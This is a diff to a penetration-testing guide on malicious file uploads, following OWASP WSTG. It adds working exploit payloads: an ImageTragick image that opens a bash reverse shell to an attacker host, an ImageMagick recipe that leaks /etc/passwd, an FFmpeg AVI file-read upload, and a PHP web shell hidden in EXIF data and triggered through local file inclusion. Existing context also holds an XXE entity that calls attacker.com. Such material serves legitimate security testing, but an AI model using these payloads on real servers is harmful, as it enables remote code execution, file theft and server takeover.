@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [business-logic, workflow, abuse, wstg, busl]
 tech_stack: []
 cwe_ids: [CWE-840]
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-busl-01, wstg-busl-02]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-busl-02: "Forgeable upload requests (no CSRF/integrity token) combined with acceptance of malicious content (XXE-laden XML, macro-enabled Office docs) let an attacker weaponize a victim's authenticated session to plant a payload that executes or exfiltrates data server-side — CSRF-to-XXE/RCE with no user interaction beyond visiting a page (Critical)"
 ---
 
 # wstg-busl-09
@@ -282,6 +283,67 @@ curl -s -X POST "https://target.com/api/upload" \
 <!-- XXE in DOCX (word/document.xml) -->
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/collect">]>
+```
+
+### ImageMagick / ImageTragick (CVE-2016-3714) — RCE via Malicious Image
+
+If the backend uses ImageMagick to resize/convert/thumbnail uploaded images, upload a file with an image extension but the following content (MVG/PostScript coercion) to achieve command execution when the file is processed:
+
+```
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1|touch "hello)'
+pop graphic-context
+```
+
+Triggered server-side by any `convert`/`identify`/thumbnail call, e.g. `convert shellexec.jpeg whatever.gif`.
+
+### ImageMagick Info Disclosure (CVE-2022-44268)
+
+Reads an arbitrary local file on the server and leaks its content inside the EXIF profile of the *converted* output image — useful when the app lets you download/view the processed image:
+
+```bash
+apt-get install pngcrush imagemagick exiftool exiv2 -y
+pngcrush -text a "profile" "/etc/passwd" exploit.png
+# Upload exploit.png; backend runs e.g. `convert exploit.png converted.png`
+# Download converted.png and inspect:
+identify -verbose converted.png
+# Decode the leaked hex-encoded content:
+python3 -c 'print(bytes.fromhex("HEX_FROM_OUTPUT").decode("utf-8"))'
+```
+
+### FFmpeg HLS Arbitrary File Read (via AVI upload)
+
+If uploaded video files are processed with FFmpeg (e.g. transcoding), an AVI containing an HLS playlist embedded in a GAB2 chunk can be used to exfiltrate local files:
+
+```bash
+# generate a malicious AVI referencing a local file to read
+./gen_xbin_avi.py file:///etc/passwd file_read.avi
+
+# upload file_read.avi to the target's video processing endpoint
+curl -s -X POST "{target}/api/upload" \
+    -H "Authorization: Bearer $TOKEN" \
+    -F "file=@file_read.avi"
+
+# server-side processing (e.g. ffmpeg -i file_read.avi output.mp4) followed by
+# playback of the resulting video may reveal the file contents
+```
+
+### Picture Compression Bypass (Payload Survives Resize)
+
+When uploaded images are resized/re-encoded server-side (defeating naive polyglot payloads), craft "bulletproof" images that hide the payload inside the compression structure itself so it survives `getimagesize()`/`imagecreatefromgif()`/thumbnailing:
+
+- JPG: use `createBulletproofJPG.py` (see PayloadsAllTheThings `Picture Compression/`)
+- PNG: hide payload in a `PLTE` chunk with `createPNGwithPLTE.php`
+- GIF: hide payload in the Global Color Table with `createGIFwithGlobalColorTable.php`
+
+Combine with EXIF-embedded PHP and a Local File Inclusion to execute:
+
+```bash
+convert -size 110x110 xc:white payload.jpg
+exiftool -Comment="<?php echo 'Command:'; if(\$_POST){system(\$_POST['cmd']);} __halt_compiler();" payload.jpg
+# then, via LFI on the uploaded file:
+curl '{target}/lfi.php?0=system' --data "1='id'"
 ```
 
 ### Malicious File Upload Tester
@@ -621,6 +683,7 @@ def add_security_headers(response):
 - [OWASP WSTG - Test Upload of Malicious Files](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files)
 - [EICAR Test File](https://www.eicar.org/download-anti-malware-testfile/)
 - [OWASP XXE Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
+- [PayloadsAllTheThings - Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
 
 
 ---
